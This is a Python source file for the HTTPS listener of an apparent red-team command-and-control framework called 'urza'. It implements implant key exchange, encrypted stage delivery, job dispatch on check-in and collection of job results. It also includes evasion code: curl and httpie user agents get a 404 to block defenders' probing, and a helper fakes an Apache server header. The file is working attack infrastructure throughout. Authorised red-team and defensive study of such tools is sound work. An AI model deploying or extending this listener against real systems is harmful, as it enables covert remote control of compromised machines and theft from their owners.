# urza\urza\core\teamserver\listeners\https.py

import sys
import asyncio
import os
import logging
#import core.state as state
from urza.core.events import Events
from urza.core.utils import create_self_signed_cert, get_ipaddress, gen_random_string, get_path_in_data_folder
from urza.core.teamserver.listener import Listener
from urza.core.ipcclient import IPCException
from quart import Quart, Blueprint, request, Response
#from quart.logging import default_handler, serving_handler
from hypercorn import Config
from hypercorn.asyncio import serve
import traceback


class STListener(Listener):
    def __init__(self):
        super().__init__()
        self.name = 'https'
        self.author = '@byt3bl33d3r'
        self.description = 'HTTPS listener'

        # For the async event loop
        self.loop = None
        self.shutdown_event = None
        self.serve_task = None

        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name': {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'https'
            },
            #'StageURL': {
            #    'Description'   :   'URL for staging.',
            #    'Required'      :   True,
            #    'Value'         :   f"https://{get_ipaddress()}"
            #},
            'BindIP': {
                'Description'   :   'The IPv4/IPv6 address to bind to.',
                'Required'      :   True,
                'Value'         :   get_ipaddress()
            },
            'Port': {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   443
            },
            'Cert': {
                'Description'   :   'SSL Certificate file',
                'Required'      :   False,
                'Value'         :   '~/.st/cert.pem'
            },
            'Key': {
                'Description'   :   'SSL Key file',
                'Required'      :    False,
                'Value'         :   '~/.st/key.pem'
            },
            'RegenCert': {
                'Description'   :   'Regenerate TLS cert',
                'Required'      :    False,
                'Value'         :    False
            },
            'CallBackURls': {
                'Description'   :   'Additional C2 Callback URLs (comma seperated)',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Comms': {
                'Description'   :   'C2 Comms to use',
                'Required'      :   True,
                'Value'         :   'https'
            }
        }

    def run(self):
        """
        Initializes and starts the Quart (Hypercorn) server in its own event loop/thread.
        """
        try:
            # If cert/key not present or user wants to regenerate, do that:
            if (self['Key'] == '~/.st/key.pem') and (self['Cert'] == '~/.st/cert.pem'):
                if (
                    not os.path.exists(get_path_in_data_folder("key.pem")) or 
                    not os.path.exists(get_path_in_data_folder("cert.pem")) or 
                    self['RegenCert']
                ):
                    create_self_signed_cert()
            
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)

            # The event that will cause Hypercorn to shut down
            self.shutdown_event = asyncio.Event()

            config = Config()
            config.ciphers = 'ALL'
            config.accesslog = os.path.join(get_path_in_data_folder("logs"), "access.log")
            config.bind = f"{self['BindIP']}:{self['Port']}"
            config.certfile = os.path.expanduser(self['Cert'])
            config.keyfile= os.path.expanduser(self['Key'])
            config.include_server_header = False # This doesn't seem to do anything?
            config.use_reloader = False
            config.debug = False

            # Make Hypercorn stop if self.shutdown_event is set:
            config.shutdown_trigger = self.shutdown_event.wait

            http_blueprint = Blueprint(__name__, 'https')
            http_blueprint.before_request(self.check_if_naughty)

            # Setup routes
            http_blueprint.add_url_rule('/<uuid:GUID>', 'key_exchange', self.key_exchange, methods=['POST'])
            http_blueprint.add_url_rule('/<uuid:GUID>', 'stage', self.stage, methods=['GET'])
            http_blueprint.add_url_rule('/<uuid:GUID>/jobs', 'jobs', self.jobs, methods=['GET'])
            http_blueprint.add_url_rule('/<uuid:GUID>/jobs/<job_id>', 'job_result', self.job_result, methods=['POST'])

            # Add a catch all route
            http_blueprint.add_url_rule('/', 'unknown_path', self.unknown_path, defaults={'path': ''})
            http_blueprint.add_url_rule('/<path:path>', 'unknown_path', self.unknown_path, methods=['GET', 'POST'])

            #logging.getLogger('quart.app').setLevel(logging.DEBUG if state.args['--debug'] else logging.ERROR)
            #logging.getLogger('quart.serving').setLevel(logging.DEBUG if state.args['--debug'] else logging.ERROR)

            self.app = Quart(__name__)
            self.app.register_blueprint(http_blueprint)

            self.serve_task = self.loop.create_task(serve(self.app, config))
            
            # Now start the loop
            self.loop.run_until_complete(self.serve_task)
            self.loop.run_until_complete(self.loop.shutdown_asyncgens())
            self.loop.close()

        except Exception as e:
            logging.error(f"Error running HTTPS listener: {e}")
            traceback.print_exc()
    
    def stop(self):
        """
        Gracefully stops the Hypercorn server by setting shutdown_event.
        """
        # if self.loop and self.shutdown_event and not self.shutdown_event.is_set():
        #     logging.debug("Stopping HTTPS listener via shutdown_event.")
        #     self.loop.call_soon_threadsafe(self.shutdown_event.set)
        # else:
        #     logging.debug("HTTPS listener was never started or is already stopped.")

        if self.loop is not None and self.shutdown_event is not None:
            logging.debug("Stopping HTTPS listener via shutdown_event...")

            # 1) Cancel the serve() task if you stored it
            if self.serve_task is not None and not self.serve_task.done():
                logging.debug("Cancelling the Hypercorn serve_task...")
                self.serve_task.cancel()

            # 2) Trigger the shutdown event so the server exits
            def do_shutdown():
                self.shutdown_event.set()

            # Because we're in a different thread's event loop, we call_soon_threadsafe:
            self.loop.call_soon_threadsafe(do_shutdown)
        else:
            logging.debug("HTTPS listener was never started or already stopped.")

    async def check_if_naughty(self):
        try:
            headers = request.headers['User-Agent'].lower()
            if 'curl' in headers or 'httpie' in headers:
                return '', 404
        except KeyError:
            pass

    async def make_normal(self, response):
        response.headers["server"] = "Apache/2.4.35"
        return response

    async def unknown_path(self, path):
        self.app.logger.error(f"{request.remote_addr} requested an unknown path: {path}")
        return '', 404

    async def key_exchange(self, GUID):
        try:
            data = await request.data
            pub_key = self.dispatch_event(Events.KEX, (GUID, request.remote_addr, data))
            return Response(pub_key, content_type='application/octet-stream')
        except IPCException:
            return '', 400

    async def stage(self, GUID):
        try:
            stage_file = self.dispatch_event(Events.ENCRYPT_STAGE, (GUID, request.remote_addr, self["Comms"]))
            self.dispatch_event(Events.SESSION_STAGED, f'Sending stage ({sys.getsizeof(stage_file)} bytes) ->  {request.remote_addr} ...')
            return Response(stage_file, content_type='application/octet-stream')
        except IPCException:
            return '', 400

    async def jobs(self, GUID):
        #self.app.logger.debug(f"Session {GUID} ({request.remote_addr}) checked in")
        try:
            job = self.dispatch_event(Events.SESSION_CHECKIN, (GUID, request.remote_addr))
            if job:
                return Response(job, content_type='application/octet-stream')
            #self.app.logger.debug(f"No jobs to give {GUID}")
            return '', 200
        except IPCException:
            return '', 400

    async def job_result(self, GUID, job_id):
        try:
            data = await request.data
            self.dispatch_event(Events.JOB_RESULT, (GUID, request.remote_addr, job_id, data))
            return '', 200
        except IPCException:
            return '', 400
